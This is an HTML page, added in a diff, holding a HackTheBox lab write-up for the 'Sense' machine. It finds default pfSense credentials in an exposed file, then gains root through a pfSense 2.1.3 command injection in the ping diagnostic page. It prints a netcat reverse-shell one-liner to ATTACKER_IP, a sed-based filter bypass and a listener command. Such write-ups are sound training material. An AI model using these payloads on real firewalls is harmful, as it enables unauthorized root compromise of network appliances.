@@ -1,0 +1,207 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<link rel="icon" type="image/x-icon" href="../images/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB - Sense</title>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 40px auto;
+            line-height: 1.6;
+            color: #222;
+        }
+
+        h1 { margin-bottom: 10px; }
+        h2 { margin-top: 40px; border-bottom: 1px solid #ddd; padding-bottom: 5px; }
+        h3 { margin-top: 25px; }
+
+        img {
+            margin: 15px 0;
+            max-width: 100%;
+            border: 1px solid #ccc;
+        }
+
+        pre {
+            background: #f4f4f4;
+            padding: 12px;
+            overflow-x: auto;
+            border-left: 4px solid #ccc;
+        }
+
+        code { font-family: Consolas, monospace; }
+
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .navbar {
+            margin-bottom: 30px;
+            padding: 10px 0;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .nav-item {
+            margin-right: 20px;
+            color: #0366d6;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .nav-item.active {
+            color: black;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="navbar">
+    <a href="../index.html" class="nav-item">Home</a>
+    <a href="../soc_lab_setup.html" class="nav-item">Lab Setup</a>
+    <a href="../case_1.html" class="nav-item">Case 1</a>
+    <a href="../case_2.html" class="nav-item">Case 2</a>
+        <a href="../case_3.html" class="nav-item">Case 3</a>
+    <a href="../ad_attacks_lab.html" class="nav-item">Active Directory Attacks</a>
+    <a href="../more_tools.html" class="nav-item">More Tools</a>
+    <a href="../htb.html" class="nav-item active">HackTheBox</a>
+<a href="../vulnhub.html" class="nav-item">Vulnhub</a>
+<a href="../offsec_proving_grounds.html" class="nav-item">Offsec Proving Grounds</a>
+</div>
+
+<!-- -->
+<h1>Sense (HTB – Easy)</h1>
+
+<p>
+Sense is a pfSense firewall appliance vulnerable to an authentication bypass and remote command execution.
+By enumerating publicly accessible configuration files, default credentials are recovered.  
+Once authenticated, a known pfSense 2.1.3 vulnerability provides a root shell.
+</p>
+
+<h2>Overview</h2>
+<p>
+Target: sense.htb  
+<br>Initial vector: exposed configuration file → default pfSense credentials  
+<br>Privilege escalation: pfSense 2.1.3 RCE → root  
+</p>
+
+<h2>Enumeration</h2>
+
+<p>Nmap:</p>
+<pre>
+22/tcp  ssh
+80/tcp  http (pfSense login page)
+</pre>
+
+<p>
+The web interface is pfSense.  
+Directory fuzzing reveals a sensitive file:
+</p>
+
+<pre>
+/system-users.txt
+</pre>
+
+<p>
+This file contains default pfSense credentials:
+</p>
+
+<pre>
+admin : pfsense
+</pre>
+
+<p>
+Login at:
+</p>
+
+<pre>
+http://sense.htb/
+</pre>
+
+<p>
+Once inside the dashboard, the version is visible:
+</p>
+
+<pre>
+pfSense 2.1.3
+</pre>
+
+<p>
+This version is vulnerable to an authenticated RCE (searchsploit).
+</p>
+
+<h2>Foothold – pfSense 2.1.3 RCE</h2>
+
+<p>
+Use the public exploit (e.g. exploit‑db 43560 or similar).  
+The exploit abuses the <code>diag_ping.php</code> page to inject commands.
+</p>
+
+<p>
+Example usage:</p>
+<pre>
+$ python3 exploit.py -u admin -p pfsense -t http://sense.htb
+</pre>
+
+<p>
+A root shell is obtained immediately because pfSense runs the web interface as root.
+</p>
+
+<h2>Alternative: Manual RCE via Filter Bypass</h2>
+
+<p>
+pfSense filters special characters, but the filter can be bypassed by replacing them with variables and using
+<code>sed</code> to reconstruct the payload.
+</p>
+
+<p>Example transformation:</p>
+<pre>
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 443 >/tmp/f" \
+  | sed 's/\//${HOME}/g' \
+  | sed 's/-/${guion}/g' \
+  | sed 's/&/${ampersand}/g'
+</pre>
+
+<p>
+This produces a payload that bypasses pfSense’s input filters and still executes a reverse shell.
+</p>
+
+<p>Listener:</p>
+<pre>
+$ nc -nlvp 443
+</pre>
+
+<p>
+Trigger the payload through the ping diagnostic page and a root shell is returned.
+</p>
+
+<h2>Privilege Escalation</h2>
+
+<p>
+pfSense’s web interface runs as root, so no privilege escalation is required.  
+Once RCE is achieved, the shell is already root.
+</p>
+
+<h2>Conclusion</h2>
+<p>
+Sense is a straightforward pfSense exploitation machine: exposed configuration files reveal default credentials,
+and pfSense 2.1.3 provides a trivial authenticated RCE path.  
+Because pfSense executes web commands as root, full system compromise is immediate.
+</p>
+
+
+
+<!-- -->
+
+</body>
+</html>
+
+
+
+
+
+
+
